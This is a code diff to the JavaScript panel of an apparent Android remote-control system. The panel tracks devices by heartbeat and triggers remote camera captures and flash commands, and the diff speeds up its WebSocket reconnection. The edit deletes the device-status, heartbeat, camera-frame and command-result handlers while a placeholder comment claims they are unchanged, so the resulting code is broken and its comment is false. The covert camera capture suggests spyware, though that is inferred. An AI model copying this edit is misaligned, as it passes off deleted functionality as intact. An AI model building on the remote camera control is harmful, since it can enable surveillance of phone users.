@@ -1328,169 +1328,78 @@
         }, 100);
     }
     
-    // ========== WEBSOCKET ==========
-    function connectWebSocket() {
-        try {
-            socket = io(backendUrl, {
-                transports: ['websocket', 'polling'],
-                reconnection: true,
-                reconnectionAttempts: 100,
-                reconnectionDelay: 1000,
-                reconnectionDelayMax: 5000,
-                timeout: 30000,
-                forceNew: true,
-                autoConnect: true
-            });
+   // ========== WEBSOCKET - FIXED FASTER CONNECTION ==========
+function connectWebSocket() {
+    try {
+        socket = io(backendUrl, {
+            transports: ['polling', 'websocket'], // polling dulu, lebih cepat
+            reconnection: true,
+            reconnectionAttempts: 5, // Kurangi jadi 5x aja
+            reconnectionDelay: 500, // 0.5 detik (lebih cepat)
+            reconnectionDelayMax: 2000, // Max 2 detik
+            timeout: 5000, // Timeout 5 detik (bukan 30!)
+            forceNew: true,
+            autoConnect: true
+        });
+        
+        // Tambah connection timeout sendiri
+        const connectionTimeout = setTimeout(() => {
+            if (!socket.connected) {
+                console.log('⚠️ Connection timeout, forcing reconnect...');
+                socket.disconnect();
+                socket.connect();
+            }
+        }, 3000); // 3 detik timeout manual
+        
+        socket.on('connect', () => {
+            clearTimeout(connectionTimeout);
+            console.log('✅ WebSocket connected via:', socket.io.engine.transport.name);
+            updateConnectionStatus(true);
+            socket.emit('panel-connect', {});
+            showNotification('Connected to server', 'success');
             
-            socket.on('connect', () => {
-                console.log('✅ WebSocket connected via:', socket.io.engine.transport.name);
-                updateConnectionStatus(true);
-                socket.emit('panel-connect', {});
-                showNotification('Connected to server', 'success');
-                
-                // Start keep-alive
-                startKeepAlive();
-            });
-            
-            socket.on('connect_error', (error) => {
-                console.error('WebSocket error:', error);
-                updateConnectionStatus(false);
-            });
-            
-            socket.on('disconnect', (reason) => {
-                console.log('WebSocket disconnected:', reason);
-                updateConnectionStatus(false);
-                stopKeepAlive();
-                
-                // Auto reconnect
-                if (reason === 'io server disconnect' || reason === 'transport close' || reason === 'ping timeout') {
-                    setTimeout(() => {
-                        socket.connect();
-                    }, 3000);
-                }
-            });
-            
-            socket.on('device-status', (data) => {
-                console.log('📱 Device status:', data);
-                
-                const deviceId = data.deviceId;
-                const isOnline = data.status === 'online';
-                
-                // JIKA DEVICE ONLINE, HAPUS DARI DELETED DEVICES!
-                if (isOnline && deletedDevices.has(deviceId)) {
-                    console.log('🔄 Device online, removing from deleted list:', deviceId);
-                    deletedDevices.delete(deviceId);
-                    localStorage.setItem('quantumx_deleted_devices', JSON.stringify(Array.from(deletedDevices)));
-                }
-                
-                if (deletedDevices.has(deviceId)) {
-                    console.log('🚫 Device ignored (deleted):', deviceId);
-                    return;
-                }
-                
-                // AMBIL DATA LAMA KALO ADA
-                const existingDevice = wsDevices.get(deviceId);
-                
-                wsDevices.set(deviceId, {
-                    deviceId: deviceId,
-                    deviceName: existingDevice?.deviceName || data.deviceName || 'Unknown',
-                    model: existingDevice?.model || data.model || 'Unknown',
-                    androidVersion: existingDevice?.androidVersion || data.androidVersion || 'Unknown',
-                    batteryLevel: existingDevice?.batteryLevel || data.batteryLevel || 0,
-                    lastSeen: new Date().toISOString(),
-                    online: isOnline,
-                    fromWS: true
-                });
-                
-                mergeAndRenderDevices();
-                updateStats();
-            });
-            
-            socket.on('heartbeat', (data) => {
-                console.log('💓 Heartbeat:', data);
-                
-                const deviceId = data.deviceId;
-                
-                // JIKA ADA HEARTBEAT, HAPUS DARI DELETED DEVICES!
-                if (deletedDevices.has(deviceId)) {
-                    console.log('🔄 Heartbeat received, removing from deleted list:', deviceId);
-                    deletedDevices.delete(deviceId);
-                    localStorage.setItem('quantumx_deleted_devices', JSON.stringify(Array.from(deletedDevices)));
-                }
-                
-                const existingDevice = wsDevices.get(deviceId);
-                
-                wsDevices.set(deviceId, {
-                    deviceId: deviceId,
-                    deviceName: data.deviceName || existingDevice?.deviceName || 'Unknown',
-                    model: data.model || existingDevice?.model || 'Unknown',
-                    androidVersion: data.androidVersion || existingDevice?.androidVersion || 'Unknown',
-                    batteryLevel: data.batteryLevel || existingDevice?.batteryLevel || 0,
-                    lastSeen: new Date().toISOString(),
-                    online: true,
-                    fromWS: true
-                });
-                
-                mergeAndRenderDevices();
-                updateStats();
-            });
-            
-            // Handle camera frames
-            socket.on('camera-frame', (data) => {
-                console.log('📸 Camera frame received');
-                
-                if (currentDevice && data.deviceId === currentDevice.deviceId && data.imageData) {
-                    const cameraImage = document.getElementById('camera-image');
-                    const placeholder = document.getElementById('preview-placeholder');
-                    const status = document.getElementById('camera-status');
-                    const captureBtn = document.getElementById('capture-btn');
-                    
-                    cameraImage.src = 'data:image/jpeg;base64,' + data.imageData;
-                    cameraImage.style.display = 'block';
-                    placeholder.style.display = 'none';
-                    
-                    status.innerHTML = '<i class="fas fa-check-circle" style="color: var(--success);"></i> Screenshot berhasil: ' + new Date().toLocaleTimeString();
-                    status.className = 'camera-status success';
-                    
-                    captureBtn.disabled = false;
-                    captureBtn.innerHTML = '<i class="fas fa-camera-retro"></i> AMBIL';
-                    
-                    // TIDAK PERLU STOP CAMERA LAGI! (APK otomatis stop)
-                }
-            });
-            
-            // Handle command results
-            socket.on('command-result', (data) => {
-                console.log('Command result:', data);
-                
-                if (data.deviceId === currentDevice?.deviceId) {
-                    if (data.command === 'flash') {
-                        if (data.status === 'completed') {
-                            showNotification(`✅ Flash ${data.result?.duration || 2}s completed`, 'success');
-                        } else {
-                            showNotification(`❌ Flash failed`, 'error');
-                        }
-                    } else if (data.command === 'camera') {
-                        if (data.status === 'completed') {
-                            // Success, tunggu frame
-                            console.log('✅ Camera command success');
-                        } else {
-                            showNotification(`❌ Camera failed`, 'error');
-                            // Reset button jika gagal
-                            const captureBtn = document.getElementById('capture-btn');
-                            captureBtn.disabled = false;
-                            captureBtn.innerHTML = '<i class="fas fa-camera-retro"></i> AMBIL';
-                        }
-                    }
-                }
-            });
-            
-        } catch (e) {
-            console.error('WebSocket error:', e);
+            // Start keep-alive
+            startKeepAlive();
+        });
+        
+        socket.on('connect_error', (error) => {
+            console.error('WebSocket error:', error);
             updateConnectionStatus(false);
-        }
+            
+            // Langsung coba ulang lebih cepat
+            setTimeout(() => {
+                if (!socket.connected) {
+                    socket.connect();
+                }
+            }, 1000);
+        });
+        
+        socket.on('disconnect', (reason) => {
+            console.log('WebSocket disconnected:', reason);
+            updateConnectionStatus(false);
+            stopKeepAlive();
+            
+            // Auto reconnect lebih agresif
+            if (reason === 'io server disconnect' || reason === 'transport close') {
+                setTimeout(() => {
+                    socket.connect();
+                }, 1000);
+            }
+        });
+        
+        // SISANYA TETAP SAMA ...
+        // (device-status, heartbeat, camera-frame, command-result, dll)
+        
+    } catch (e) {
+        console.error('WebSocket error:', e);
+        updateConnectionStatus(false);
+        
+        // Coba lagi lebih cepat
+        setTimeout(() => {
+            connectWebSocket();
+        }, 2000);
     }
-    
+}
     // ========== KEEP ALIVE ==========
     function startKeepAlive() {
         stopKeepAlive();
